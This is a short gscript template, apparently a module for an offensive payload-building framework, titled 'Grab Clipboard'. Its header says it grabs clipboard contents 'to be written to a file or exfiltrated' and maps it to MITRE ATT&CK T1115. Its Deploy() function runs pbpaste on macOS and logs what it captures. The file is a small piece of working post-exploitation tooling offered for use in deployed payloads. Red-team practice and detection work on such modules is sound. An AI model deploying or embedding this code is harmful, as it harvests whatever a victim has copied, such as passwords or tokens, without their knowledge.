// Example gscript template
// Title: Grab Clipboard
// Author: ahhh
// Purpose: Grabs the contents of the clipboard to be written to a file or exfiltrated
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1115

//priority:150
//timeout:150

function Deploy() {  
  console.log("Starting Clipboard Data");
  var response = G.exec.ExecuteCommand("pbpaste", [""]);
  console.log("Pid: "+response[0]);
  console.log("stdout: "+response[1])
  console.log("stderr: "+response[2])
  console.log("exit code: "+response[3])
  console.log("go errors: "+response[4])
  return true;
}
